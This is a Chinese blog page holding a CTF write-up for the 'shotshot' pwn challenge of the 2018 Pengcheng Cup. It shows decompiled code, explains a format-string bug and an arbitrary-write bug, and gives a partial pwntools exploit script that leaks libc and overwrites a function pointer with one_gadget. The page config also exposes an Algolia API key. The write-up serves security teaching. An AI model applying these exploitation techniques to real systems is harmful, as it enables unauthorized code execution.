@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="shotshot基本逻辑123451. create weapon2. show weapon3. drop weapon4. shot5. exit create创建一个weapon，weapon的长度和名字都由用户输入。 12345678910111213141516171819202122232425__int64 create()&amp;#123;  int v1; // [sp+4h] [bp">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018鹏城杯pwn">
+<meta property="og:url" content="http://0gur1.cc/2019/01/04/2018鹏城杯pwn/index.html">
+<meta property="og:site_name" content="0gur1">
+<meta property="og:description" content="shotshot基本逻辑123451. create weapon2. show weapon3. drop weapon4. shot5. exit create创建一个weapon，weapon的长度和名字都由用户输入。 12345678910111213141516171819202122232425__int64 create()&amp;#123;  int v1; // [sp+4h] [bp">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-01-17T14:58:21.839Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018鹏城杯pwn">
+<meta name="twitter:description" content="shotshot基本逻辑123451. create weapon2. show weapon3. drop weapon4. shot5. exit create创建一个weapon，weapon的长度和名字都由用户输入。 12345678910111213141516171819202122232425__int64 create()&amp;#123;  int v1; // [sp+4h] [bp">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+	  applicationID: '7MHLMVVD1M',
+      apiKey: 'dbb74cd528079f8c1d1a6138e9ed5b67',
+      indexName: 'test_hexo',
+      hits: "",
+      labels: ""
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0gur1.cc/2019/01/04/2018鹏城杯pwn/"/>
+
+
+
+
+
+  <title>2018鹏城杯pwn | 0gur1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0gur1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  <!-- -->
+  
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2019/01/04/2018鹏城杯pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0gur1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0gur1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018鹏城杯pwn</h1>
+        
+
+        <div class="post-meta">
+		  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-04T19:42:25+08:00">
+                2019-01-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/01/04/2018鹏城杯pwn/" class="leancloud_visitors" data-flag-title="2018鹏城杯pwn">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,980字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="shotshot"><a href="#shotshot" class="headerlink" title="shotshot"></a>shotshot</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. create weapon</span><br><span class="line">2. show weapon</span><br><span class="line">3. drop weapon</span><br><span class="line">4. shot</span><br><span class="line">5. exit</span><br></pre></td></tr></table></figure>
+<p>create创建一个weapon，weapon的长度和名字都由用户输入。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+4h] [bp-Ch]@2</span></span><br><span class="line">  __int64 v2; <span class="comment">// [sp+8h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input the length of your weapon's name:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x200000</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"too long!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  weapon = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( !weapon )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"malloc error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the name:"</span>);</span><br><span class="line">  to_read(weapon, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>show输出weapon内容，存在格式化字符串漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( weapon )</span><br><span class="line">    result = <span class="built_in">printf</span>(weapon);                    <span class="comment">// format string</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"No weapon!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>drop释放weapon并置零。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">drop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( weapon )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I can't believe it!"</span>);</span><br><span class="line">    <span class="built_in">free</span>(weapon);</span><br><span class="line">    weapon = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No weapon!"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>shot函数中用到的start，是在init_addr中mmap(8)（简写）后返回的一个地址，由于mmap必须以页为单位进行映射，即使mmap的参数为8，也会映射到一页上。这里start是一个指针，指向一块类似于虚表的位置，结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sshot</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">//4 bytes</span></span><br><span class="line">  <span class="keyword">int</span> num;<span class="comment">//4 bytes</span></span><br><span class="line">  <span class="keyword">int</span> (*init)(<span class="keyword">int</span> *num,<span class="keyword">int</span> value); <span class="comment">//pointer 8 bytes</span></span><br><span class="line">  <span class="keyword">int</span> (*get_id)(<span class="keyword">int</span> *id); <span class="comment">//pointer 8 bytes</span></span><br><span class="line">  <span class="keyword">int</span> (*dead)(struct shot *s);<span class="comment">//pointer 8 bytes</span></span><br><span class="line">&#125;shot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">shot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v0; <span class="comment">// rsi@2</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sshot</span> **<span class="title">v1</span>;</span> <span class="comment">// rbx@3</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+4h] [bp-1Ch]@2</span></span><br><span class="line">  __int64 v4; <span class="comment">// [sp+8h] [bp-18h]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( weapon )</span><br><span class="line">  &#123;</span><br><span class="line">    puts_shot();</span><br><span class="line">    v0 = &amp;v3;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( !*start )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = start;                               <span class="comment">// mmap(8)</span></span><br><span class="line">      v0 = (<span class="keyword">int</span> *)<span class="number">40</span>;</span><br><span class="line">      *v1 = (struct sshot *)mmap(<span class="number">0L</span>L, <span class="number">0x28</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0L</span>L);</span><br><span class="line">      <span class="keyword">if</span> ( *start == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"mmap error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    (*start)-&gt;init = (__int64)init;</span><br><span class="line">    (*start)-&gt;get_id = (__int64)get_id;</span><br><span class="line">    (*start)-&gt;dead = (__int64)dead;</span><br><span class="line">    (*start)-&gt;congratulation = (__int64)congratulations;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (<span class="keyword">int</span> *)<span class="number">4</span>;</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span> *, <span class="keyword">signed</span> __int64))(*start)-&gt;init)(&amp;(*start)-&gt;num, <span class="number">4L</span>L);</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(struct sshot *))(*start)-&gt;get_id)(*start);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (<span class="keyword">int</span> *)<span class="number">6</span>;</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">int</span> *, <span class="keyword">signed</span> __int64))(*start)-&gt;init)(&amp;(*start)-&gt;num, <span class="number">6L</span>L);</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(struct sshot *))(*start)-&gt;get_id)(*start);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (<span class="keyword">int</span> *)<span class="number">8</span>;</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_QWORD, <span class="keyword">signed</span> __int64))(*start)-&gt;init)(&amp;(*start)-&gt;num, <span class="number">8L</span>L);</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_QWORD))(*start)-&gt;get_id)(*start);</span><br><span class="line">    &#125;</span><br><span class="line">    --(*start)-&gt;num;                     </span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(struct sshot *, <span class="keyword">int</span> *))(*start)-&gt;dead)(*start, v0) )</span><br><span class="line">    &#123;</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(*start)-&gt;congratulation)();</span><br><span class="line">      *start = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No weapon!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>dead函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">dead</span><span class="params">(struct sshot *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx@4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+1Ch] [bp-14h]@2</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [sp+20h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> id; <span class="comment">// [sp+24h] [bp-Ch]@1</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+28h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  num = a1-&gt;num;                       </span><br><span class="line">  id = a1-&gt;id;</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d is dead...\n"</span>, id);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Give me your luckynum:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">    *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)id + a1) = v3;</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h2><p>由于是线下赛，遇到格式化字符串大家肯定都会第一时间patch，所以没有从格式化字符串漏洞入手。</p>
+<p>在shot函数里调用了mmap，通过动态调试，能够观察到mmap的映射是从高地址向低地址进行的，在init_addr中为start映射的地址比后续mmap的都要高。start中的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x6020d0</span><br><span class="line">0x6020d0 &lt;start&gt;:	0x00007ffff7ff6000</span><br></pre></td></tr></table></figure>
+<p>调用shot函数时，mmap(0x28)返回的地址，即rax为0x7ffff7ff5000：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*RAX  0x7ffff7ff5000 ◂— 0x0</span><br><span class="line"> RBX  0x7ffff7ff6000 ◂— 0x0</span><br><span class="line">……</span><br><span class="line">─────────────────────[ DISASM ]───────────────────────</span><br><span class="line">   0x400bc9 &lt;shot+126&gt;    call   mmap@plt &lt;0x400760&gt;</span><br><span class="line"> </span><br><span class="line"> ► 0x400bce &lt;shot+131&gt;    mov    qword ptr [rbx], rax</span><br></pre></td></tr></table></figure>
+<p>另外，在dead函数中，存在任意写的漏洞。id和v3均由用户操作，可以向任意内存进行写操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)id + a1) = v3;</span><br></pre></td></tr></table></figure>
+<p>结合这两点实现漏洞利用。</p>
+<p>1.每次mmap的地址偏移都是0x1000，且由高地址向低地址增长；</p>
+<p>2.内存任意写</p>
+<p>利用的方式是，通过任意写向mmap区域中的某一个高地址写入one_gadget的地址，一次写入一个字节，分6次写入；再修改*start里面的值的倒数第二位，使修改后的值，congratulation函数位置对应到我们写入one_gadget的地址即可。这个倒数第二位的值可以根据libc与mmap之间的偏移进行计算，有少许的概率会失败。</p>
+<p>one_gadget地址需要通过泄露libc来实现，在welcome输入name时，由于read不会向末尾加入\0，printf时会输出name后面的内容，通过查看此时的栈，发现其中有setvbuf+154的地址，作为libc地址的泄露。</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">timeout = <span class="number">0</span></span><br><span class="line">gadget=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./shotshot'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your name :"</span>,name,timeout)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(name,n)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">'1'</span>,timeout)</span><br><span class="line">	p.sendlineafter(<span class="string">"Input the length of your weapon's name:\n"</span>,str(n),timeout)</span><br><span class="line">	p.sendlineafter(<span class="string">"Input the name:\n"</span>,name,timeout)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">'2'</span>,timeout)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(ids,luckynum)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Input the id:\n"</span>,str(ids),timeout)</span><br><span class="line">	p.sendlineafter(<span class="string">"Give me your luckynum:\n"</span>,str(luckynum),timeout)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shot</span><span class="params">(ids,luckynum,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">'4'</span>,timeout)</span><br><span class="line">	p.sendlineafter(<span class="string">"3. C++\n"</span>,str(num),timeout)</span><br><span class="line">	p.sendlineafter(<span class="string">"Input the id:\n"</span>,str(ids),timeout)</span><br><span class="line">	<span class="keyword">if</span> flag:</span><br><span class="line">		p.sendlineafter(<span class="string">"Give me your luckynum:\n"</span>,str(luckynum),timeout)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">select_shot</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'exit'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)	</span><br><span class="line">	p.recvuntil(<span class="string">'3. C++'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_one</span><span class="params">(where,value)</span>:</span></span><br><span class="line">	select_shot(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">	p.sendline(str(where))</span><br><span class="line">	select_shot(<span class="number">0</span>)</span><br><span class="line">	select_shot(<span class="number">0</span>)</span><br><span class="line">	select_shot(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'luckynum:'</span>)</span><br><span class="line">	p.sendline(str(value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc address</span></span><br><span class="line">welcome(<span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">40</span>)</span><br><span class="line">setvbuf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-154</span></span><br><span class="line">log.info(<span class="string">"setvbuf address:%#x"</span>,setvbuf_addr)</span><br><span class="line">libc_addr = setvbuf_addr - libc.symbols[<span class="string">'setvbuf'</span>]</span><br><span 